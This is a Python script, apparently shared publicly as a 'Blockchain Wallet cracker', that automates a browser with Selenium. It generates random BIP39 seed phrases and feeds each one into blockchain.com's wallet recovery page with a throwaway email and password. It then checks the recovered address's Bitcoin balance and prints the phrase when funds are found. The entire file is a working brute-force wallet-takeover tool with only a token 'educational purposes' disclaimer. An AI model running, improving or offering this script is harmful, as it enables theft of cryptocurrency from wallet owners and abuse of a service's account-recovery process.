# Blockchain Wallet cracker : Using passphrase
# Author : Yehan Wasura
# Date : 2020 November 10
# Help me on Patreon : patreon.com/yehanwasura
# help me on PayPal : paypal.me/cyberrex599


# Note: Educational Purposes only

from selenium import webdriver
from selenium.webdriver.support.select import Select
import string
import random
import time
import blockcypher
from moneywagon import AddressBalance
import pyperclip
import os

def password():
    numbers = string.digits
    letters = string.ascii_lowercase
    capletters = string.ascii_uppercase
    alphanumeric = letters + numbers + capletters
    mix = alphanumeric
    intPasswordLength = 12

    Password = ''.join([random.choice(mix) for x in range(intPasswordLength)])
    return Password

# email generator : use whatever your want
def emailm():
	ebody = string.ascii_lowercase
	length = 4
	length2 = 5
	result_str = ''.join(random.choice(ebody) for i in range(length))
	result_str2 = ''.join(random.choice(ebody) for i in range(length))

	#email
	email = result_str+'tmp'+'+'+result_str2+'@gmail.com'
	return email

def passphrasegen():

       # I use Chrome You can use any web browser that support by Selenium, check those out in selenium documentation

	options = webdriver.ChromeOptions()
	options.binary_location = "E:/C/Cx86/Google/Chrome/Application/chrome.exe" # Locate the Google Chrome Executable here
	chrome_driver_binary = "chromedriver.exe" # Locate the Google Chrome Driver here(get a driver with similar version to your google chrome version)

	driver = webdriver.Chrome(chrome_driver_binary, chrome_options=options)

	driver.get("https://iancoleman.io/bip39/") #Passphrase generating site
	elem = driver.find_element_by_id("strength")
	select = Select(elem)
	select.select_by_visible_text('12')
	elem = driver.find_element_by_css_selector(".btn.generate").click()
	elem = driver.find_element_by_css_selector('.phrase.private-data.form-control')

	#passphrase
	passphrase = elem.get_attribute("value")
	driver.close()
	return passphrase

def login():

        # Please change the sleeping times, if your internet speed is high otherwise you it will waste your time, my internet 
        #connection is really slow that's why i add some more sleep time.

	PWD = password()
	PP = passphrasegen()
	EMAIL = emailm()

	options = webdriver.ChromeOptions()
	options.binary_location = "E:/C/Cx86/Google/Chrome/Application/chrome.exe"
	options.add_experimental_option("detach", True)
	chrome_driver_binary = "chromedriver.exe"
	#global driver
	driver = webdriver.Chrome(chrome_driver_binary, chrome_options=options)

	driver.get("https://login.blockchain.com/en/#/recover")
	time.sleep(5)
	elem = driver.find_element_by_name("mnemonic")
	elem.send_keys(PP)
	elem = driver.find_element_by_css_selector(".sc-bdVaJa.iOqSrY").click()
	elem = driver.find_element_by_name("email")
	elem.send_keys(EMAIL)
	elem = driver.find_element_by_name("password")
	elem.send_keys(PWD)
	elem = driver.find_element_by_name("confirmationPassword")
	elem.send_keys(PWD)
	elem = driver.find_element_by_css_selector(".sc-bdVaJa.iOqSrY").click()
	time.sleep(40)
	elem = driver.find_element_by_css_selector(".sc-bdVaJa.RwQbC").click()
	time.sleep(10)
	elem = driver.find_element_by_xpath("//span[text()='Request']").click()
	elem = driver.find_element_by_css_selector('.sc-htpNat.gHBYSC').click()
	address = pyperclip.paste()

	#Checking the Balance

	try:
		total = blockcypher.get_total_balance(address)
	except:
		total = AddressBalance().action('btc', address)

	if 0 < total:
		os.system(r'cls')
		print(" [+]     Account is Cracked      [+]\n\n")
		print("Address         : " + address)
		print("Address Balance : " + str(total))
		print("Passphrase      : " + PP)
		print("Email           : " + EMAIL)
		print("Password        : " + PWD)       
	else:
		driver.close()

login()


	




